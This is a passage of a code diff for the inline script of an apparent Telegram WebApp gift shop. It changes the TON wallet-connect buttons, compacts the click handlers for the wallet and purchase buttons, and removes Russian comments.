             document.getElementById('walletTonhub').addEventListener('click', () => connectWallet('tonhub'));
-            document.getElementById('walletOpenMask').addEventListener('click', () => connectWallet('openmask'));
+            document.getElementById('walletViewAll').addEventListener('click', () => connectWallet('viewall'));
+            document.getElementById('telegramWalletBtn').addEventListener('click', () => connectWallet('telegram'));
             document.getElementById('closeModal').addEventListener('click', hideWalletModal);
             document.getElementById('closeDetailModal').addEventListener('click', closeGiftDetail);
-            document.getElementById('walletIndicator').addEventListener('click', () => {
-                if (!walletAddress) showWalletModal();
-            });
-
-            // Кнопка Buy в деталях
+            document.getElementById('walletIndicator').addEventListener('click', () => { if (!walletAddress) showWalletModal(); });
             document.getElementById('detailBuyBtn').addEventListener('click', () => {
                 if (!selectedGift) return;
-                if (!walletAddress) {
-                    hideWalletModal(); // на всякий случай закроем детали? лучше открыть модалку кошелька
-                    closeGiftDetail();
-                    showWalletModal();
-                } else {
-                    sendTransaction(selectedGift.price);
-                }
+                if (!walletAddress) { closeGiftDetail(); showWalletModal(); }
+                else sendTransaction(selectedGift.price);
             });
-
-            // Закрытие модалок по оверлею
             document.getElementById('walletModal').addEventListener('click', (e) => {
                 if (e.target.classList.contains('modal-overlay')) hideWalletModal();
             });
@@ -781,15 +422,9 @@
                 if (e.target.classList.contains('modal-overlay')) closeGiftDetail();
             });
 
-            // Запуск
             renderGifts();
             initTonConnect();
-
-            // Telegram WebApp
-            if (window.Telegram?.WebApp) {
-                Telegram.WebApp.ready();
-                Telegram.WebApp.expand();
-            }
+            if (window.Telegram?.WebApp) { Telegram.WebApp.ready(); Telegram.WebApp.expand(); }
         })();
     </script>
 </body>
